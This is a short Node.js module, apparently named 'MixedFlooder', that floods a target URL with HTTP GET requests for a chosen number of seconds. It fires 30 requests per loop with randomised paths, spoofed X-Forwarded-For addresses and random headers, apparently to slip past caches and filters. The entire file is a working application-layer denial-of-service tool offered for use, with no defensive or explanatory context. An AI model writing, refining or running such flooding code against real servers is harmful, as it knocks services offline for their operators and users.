
const http = require("http");
const https = require("https");
const { URL } = require("url");

function randomPath() {
  return "/" + Array(5).fill(0).map(() => Math.random().toString(36).substring(2, 8)).join("/");
}

function randomHeaders() {
  const headers = {
    "User-Agent": "MixedFlooder/1.0",
    "X-Forwarded-For": Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".")
  };
  for (let i = 0; i < 5; i++) {
    headers["X-" + Math.random().toString(36).substring(2, 8)] = Math.random().toString(36).substring(2);
  }
  return headers;
}

module.exports = function (target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const options = {
      method: "GET",
      hostname: url.hostname,
      path: randomPath(),
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers: randomHeaders()
    };
    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using ${options.method}`);
      res.on("data", () => {});
    });
    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 30; i++) send();
    setImmediate(loop);
  }

  loop();
};
